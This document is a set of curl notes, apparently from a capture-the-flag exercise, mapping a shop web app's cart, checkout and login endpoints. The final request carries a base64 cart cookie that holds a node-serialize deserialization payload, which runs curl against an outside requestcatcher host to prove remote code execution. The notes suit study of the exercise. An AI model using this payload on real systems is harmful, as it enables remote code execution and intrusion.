http://two.jh2i.com:50007/item/Haworthiopsis%20attenuata

-- Add to cart (using GET?)
curl 'http://two.jh2i.com:50007/add2cart?item=Haworthiopsis%20attenuata' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://two.jh2i.com:50007/item/Haworthiopsis%20attenuata' \
  -H 'Accept-Language: en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5' \
  --compressed \
  --insecure

-- Again (calls 302 to Cart)
  curl 'http://two.jh2i.com:50007/add2cart?item=Dracaena%20trifasciata' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://two.jh2i.com:50007/item/Dracaena%20trifasciata' \
  -H 'Accept-Language: en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5' \
  -H 'Cookie: cart=eyJpdGVtcyI6eyIwIjp7Im5hbWUiOiJIYXdvcnRoaW9wc2lzIGF0dGVudWF0YSIsInByaWNlIjoxOS45OSwiY291bnQiOjF9LCIxIjp7Im5hbWUiOiJMZW1vbiB0cmVlIiwicHJpY2UiOjQ5Ljk5LCJjb3VudCI6MX19fQ%3D%3D' \
  --compressed \
  --insecure

-- Call the Cart (from 302 above)
  curl 'http://two.jh2i.com:50007/cart' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://two.jh2i.com:50007/item/Dracaena%20trifasciata' \
  -H 'Accept-Language: en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5' \
  -H 'Cookie: cart=eyJpdGVtcyI6eyIwIjp7Im5hbWUiOiJIYXdvcnRoaW9wc2lzIGF0dGVudWF0YSIsInByaWNlIjoxOS45OSwiY291bnQiOjF9LCIxIjp7Im5hbWUiOiJMZW1vbiB0cmVlIiwicHJpY2UiOjQ5Ljk5LCJjb3VudCI6MX0sIjIiOnsibmFtZSI6IkRyYWNhZW5hIHRyaWZhc2NpYXRhIiwicHJpY2UiOjE0Ljk5LCJjb3VudCI6MX19fQ%3D%3D' \
  --compressed \
  --insecure

-- Remove item

curl 'http://two.jh2i.com:50007/removeFromCart?item=Lemon%20tree' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://two.jh2i.com:50007/cart' \
  -H 'Accept-Language: en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5' \
  -H 'Cookie: cart=eyJpdGVtcyI6eyIwIjp7Im5hbWUiOiJIYXdvcnRoaW9wc2lzIGF0dGVudWF0YSIsInByaWNlIjoxOS45OSwiY291bnQiOjF9LCIxIjp7Im5hbWUiOiJMZW1vbiB0cmVlIiwicHJpY2UiOjQ5Ljk5LCJjb3VudCI6MX0sIjIiOnsibmFtZSI6IkRyYWNhZW5hIHRyaWZhc2NpYXRhIiwicHJpY2UiOjE0Ljk5LCJjb3VudCI6MX19fQ%3D%3D' \
  --compressed \
  --insecure

-- Checkout (disabled)

-- Obs: 
	- No parameters
	-- Cookies! (base64)
	-- cart={"items":{"0":{"name":"Haworthiopsis attenuata","price":19.99,"count":1},"2":{"name":"Dracaena trifasciata","price":14.99,"count":1}}}

curl 'http://two.jh2i.com:50007/checkout' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://two.jh2i.com:50007/cart' \
  -H 'Accept-Language: en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5' \
  -H 'Cookie: cart=eyJpdGVtcyI6eyIwIjp7Im5hbWUiOiJIYXdvcnRoaW9wc2lzIGF0dGVudWF0YSIsInByaWNlIjoxOS45OSwiY291bnQiOjF9LCIyIjp7Im5hbWUiOiJEcmFjYWVuYSB0cmlmYXNjaWF0YSIsInByaWNlIjoxNC45OSwiY291bnQiOjF9fX0%3D' \
  --compressed \
  --insecure

-- Sign Up

curl 'http://two.jh2i.com:50007/signup' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: http://two.jh2i.com:50007' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://two.jh2i.com:50007/signup' \
  -H 'Accept-Language: en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5' \
  --data-raw 'username=Nep22&password=nep22&password2=nep22' \
  --compressed \
  --insecure

-- Sign In (Case sensitive for user and pwd)

curl 'http://two.jh2i.com:50007/signin' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: http://two.jh2i.com:50007' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://two.jh2i.com:50007/signin' \
  -H 'Accept-Language: en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5' \
  --data-raw 'username=Nep22&password=nep22' \
  --compressed \
  --insecure



-- Lets try a small payload
curl 'http://two.jh2i.com:50007/cart' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://two.jh2i.com:50007/item/Dracaena%20trifasciata' \
  -H 'Accept-Language: en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5' \
  -H 'Cookie: cart=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCBodHRwczovL25lcHR1bmlhbi5yZXF1ZXN0Y2F0Y2hlci5jb20vdGVzdCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pOyB9In0%3D' \
  --compressed \
  --insecure